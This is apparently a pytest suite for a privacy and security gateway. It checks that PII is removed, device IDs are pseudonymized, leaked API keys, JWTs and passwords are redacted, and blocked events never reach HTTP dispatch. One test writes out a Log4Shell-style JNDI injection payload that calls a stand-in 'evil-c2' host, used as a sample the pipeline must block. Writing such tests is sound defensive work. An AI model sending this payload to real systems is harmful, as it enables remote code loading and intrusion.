"""
Comprehensive Pre-Send Privacy & Security Pipeline Test Suite
Verifies all 15 required invariants:
1. Raw IP removal
2. Username removal
3. Location removal
4. Device-ID pseudonymization
5. API-key detection & sanitization
6. JWT detection & sanitization
7. Password detection & sanitization
8. Malformed event rejection
9. Oversized payload rejection
10. Telemetry optimization
11. Re-validation after optimization
12. BLOCKED event never reaches HTTP dispatch
13. SAFE event reaches HTTP dispatch
14. Frontend cannot directly send raw event
15. Central server rejects forbidden fields
"""

import pytest
import json
from unittest.mock import patch
from httpx import AsyncClient

from privacy_gateway.gateway import PrivacyGateway, PreSendPipeline, PreSendResult
from privacy_gateway.threat_inspector import EdgeThreatInspector, ThreatInspectionStatus
from privacy_gateway.optimizer import TelemetryOptimizer
from privacy_gateway.leakage_prevention import (
    validate_protected_payload,
    evaluate_safety_decision,
    SafetyVerdict,
    FORBIDDEN_RAW_FIELDS
)
from agent.client import LocalAgentClient

@pytest.fixture
def base_raw_event():
    return {
        "event_id": "evt_test_audit_001",
        "timestamp": "2026-09-27T12:00:00Z",
        "organization_id": "org_enterprise_a",
        "agent_id": "agent-dmz-01",
        "event_type": "brute_force_attack",
        "telemetry_source": "TEST",
        "username": "admin_robert",
        "source_ip": "192.168.1.105",
        "destination_ip": "10.0.0.1",
        "device_id": "DELL-LATITUDE-7420",
        "location": "Frankfurt DC, Level 2",
        "failed_attempts": 15,
        "destination_port": 22,
        "protocol": "TCP",
        "attack_indicators": ["PASSWORD_SPRAY", "PASSWORD_SPRAY", "DICTIONARY_ATTACK"],
        "duration_seconds": 45,
        "bytes_transferred": 18400,
        "debug_trace": "internal_memory_dump_should_be_purged",
    }

# 1. Raw IP Removal
def test_raw_ip_removal(base_raw_event):
    gateway = PrivacyGateway()
    protected = gateway.transform_event(base_raw_event)
    assert "source_ip" not in protected
    assert "destination_ip" not in protected
    assert "192.168.1.105" not in json.dumps(protected)

# 2. Username Removal
def test_username_removal(base_raw_event):
    gateway = PrivacyGateway()
    protected = gateway.transform_event(base_raw_event)
    assert "username" not in protected
    assert "admin_robert" not in json.dumps(protected)

# 3. Location Removal
def test_location_removal(base_raw_event):
    base_raw_event["latitude"] = 50.1109
    base_raw_event["longitude"] = 8.6821
    gateway = PrivacyGateway()
    protected = gateway.transform_event(base_raw_event)
    assert "location" not in protected
    assert "latitude" not in protected
    assert "longitude" not in protected
    assert "Frankfurt" not in json.dumps(protected)

# 4. Device-ID Pseudonymization
def test_device_id_pseudonymization(base_raw_event):
    gateway = PrivacyGateway()
    protected = gateway.transform_event(base_raw_event)
    assert protected["device_id"] != base_raw_event["device_id"]
    assert protected["device_id"].startswith("DEV-")
    assert len(protected["device_id"]) > 4

# 5. API-Key Detection & Inline Sanitization
def test_api_key_detection():
    inspector = EdgeThreatInspector()
    event_with_key = {
        "event_id": "evt_test_key",
        "timestamp": "2026-09-27T12:00:00Z",
        "attack_indicators": ["AWS credentials leak AKIAIOSFODNN7EXAMPLE detected in trace"]
    }
    result = inspector.inspect(event_with_key)
    assert any("AWS API Key" in sec for sec in result.secrets_detected)

    # Verify gateway redacts inline
    gateway = PrivacyGateway()
    protected = gateway.transform_event(event_with_key)
    assert "AKIAIOSFODNN7EXAMPLE" not in json.dumps(protected)
    assert "[REDACTED-KEY]" in json.dumps(protected)

# 6. JWT Detection & Inline Sanitization
def test_jwt_detection():
    fake_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.do_not_use_in_prod_test_sig_123"
    inspector = EdgeThreatInspector()
    event_with_jwt = {
        "event_id": "evt_test_jwt",
        "timestamp": "2026-09-27T12:00:00Z",
        "attack_indicators": [f"Bearer {fake_jwt}"]
    }
    result = inspector.inspect(event_with_jwt)
    assert any("JWT Token" in sec for sec in result.secrets_detected)

    gateway = PrivacyGateway()
    protected = gateway.transform_event(event_with_jwt)
    assert fake_jwt not in json.dumps(protected)
    assert "[REDACTED-JWT]" in json.dumps(protected)

# 7. Password Detection
def test_password_detection(base_raw_event):
    base_raw_event["password"] = "ClearTextSecret123!"
    base_raw_event["attack_indicators"] = ["Attempt with password=ClearTextSecret123!"]

    gateway = PrivacyGateway()
    protected = gateway.transform_event(base_raw_event)
    assert "password" not in protected
    assert "ClearTextSecret123!" not in json.dumps(protected)
    assert "[REDACTED-PASSWORD]" in json.dumps(protected)

# 8. Malformed Event Rejection
def test_malformed_event_rejection():
    pipeline = PreSendPipeline()

    # Non-dictionary payload
    res1 = pipeline.process("not a valid json dict")
    assert res1.verdict == SafetyVerdict.BLOCKED
    assert not res1.is_safe_to_send
    assert res1.threat_inspection.status == ThreatInspectionStatus.MALFORMED

    # Missing mandatory keys
    res2 = pipeline.process({"random_field": "no event id or timestamp"})
    assert res2.verdict == SafetyVerdict.BLOCKED
    assert not res2.is_safe_to_send

# 9. Oversized Payload Rejection
def test_oversized_payload_rejection(base_raw_event):
    inspector = EdgeThreatInspector(max_payload_bytes=1000)
    oversized_event = dict(base_raw_event)
    oversized_event["large_junk"] = "A" * 5000
    res = inspector.inspect(oversized_event)
    assert res.status == ThreatInspectionStatus.MALFORMED
    assert res.is_blocking

# 10. Telemetry Optimization
def test_telemetry_optimization(base_raw_event):
    optimizer = TelemetryOptimizer()
    base_raw_event["debug_log"] = "trace-data"
    base_raw_event["empty_field"] = None

    opt_res = optimizer.optimize(base_raw_event)
    assert "debug_log" in opt_res.removed_fields
    assert "empty_field" in opt_res.removed_fields
    # Indicator deduplication
    indicators = opt_res.optimized_event["attack_indicators"]
    assert len(indicators) == 2  # Deduplicated from 3 (PASSWORD_SPRAY, DICTIONARY_ATTACK)
    # Metric bucketization
    assert "TIER_" in str(opt_res.optimized_event["duration_seconds"])
    assert "TIER_" in str(opt_res.optimized_event["bytes_transferred"])

# 11. Re-validation After Optimization
def test_revalidation_after_optimization(base_raw_event):
    pipeline = PreSendPipeline()
    # Add unaggregated numeric metrics and duplicate indicators
    base_raw_event["duration_seconds"] = 12
    base_raw_event["bytes_transferred"] = 5500
    base_raw_event["attack_indicators"] = ["SCAN", "SCAN", "PORT_SWEEP"]

    res = pipeline.process(base_raw_event)
    assert res.verdict == SafetyVerdict.SAFE
    assert res.is_safe_to_send
    assert res.safe_artifact is not None
    # Verify candidate was optimized and validated clean
    assert any("Optimization Pass" in log for log in res.decision_log)
    assert "TIER_" in res.safe_artifact["duration_seconds"]

# 12. BLOCKED Event Never Reaches HTTP Dispatch
def test_blocked_event_never_reaches_http_dispatch(base_raw_event):
    client = LocalAgentClient()

    # Inject an active exploit pattern that must be blocked
    malicious_event = dict(base_raw_event)
    malicious_event["attack_payload"] = "${jndi:ldap://evil-c2.internal/a}"

    with patch.object(client, "_dispatch_queue_item") as mock_dispatch:
        success, resp = client.process_and_transmit(malicious_event)

        assert not success
        assert resp["verdict"] == "BLOCKED"
        # CRITICAL INVARIANT: Dispatcher must NEVER be invoked!
        mock_dispatch.assert_not_called()
        # Item must not be enqueued in local queue
        assert client.queue.size() == 0

# 13. SAFE Event Reaches HTTP Dispatch
def test_safe_event_reaches_http_dispatch(base_raw_event):
    client = LocalAgentClient()

    with patch.object(client, "_dispatch_queue_item", return_value=(True, {"status": "SUCCESS"})) as mock_dispatch:
        success, resp = client.process_and_transmit(base_raw_event)

        assert success
        mock_dispatch.assert_called_once()
        # Dispatched payload is the verified safe artifact
        dispatched_payload = mock_dispatch.call_args[0][0].payload
        assert "username" not in dispatched_payload
        assert "source_ip" not in dispatched_payload
        assert dispatched_payload["device_id"].startswith("DEV-")

# 14. Frontend Cannot Directly Send Raw Event (Central Rejection)
@pytest.mark.asyncio
async def test_frontend_cannot_directly_send_raw_event(async_client: AsyncClient, base_raw_event):
    # If someone attempted to bypass the client pipeline and send raw event with raw PII
    res = await async_client.post("/api/v1/events", json=base_raw_event)
    # Must be rejected by the server-side second safety boundary
    assert res.status_code == 400
    err_body = str(res.json())
    assert "PRIVACY_BOUNDARY_VIOLATION" in err_body
    assert "username" in err_body
    assert "source_ip" in err_body

# 15. Central Server Rejects Forbidden Fields
@pytest.mark.asyncio
async def test_central_server_rejects_forbidden_fields(async_client: AsyncClient):
    for field in ["password", "mac_address", "jwt", "location", "raw_network_logs"]:
        bad_payload = {
            "event_id": f"evt_leak_check_{field}",
            "timestamp": "2026-09-27T12:00:00Z",
            "organization_id": "org_enterprise_a",
            "event_type": "probe",
            field: "should_trigger_immediate_rejection"
        }
        res = await async_client.post("/api/v1/events", json=bad_payload)
        assert res.status_code == 400
        assert "PRIVACY_BOUNDARY_VIOLATION" in str(res.json())
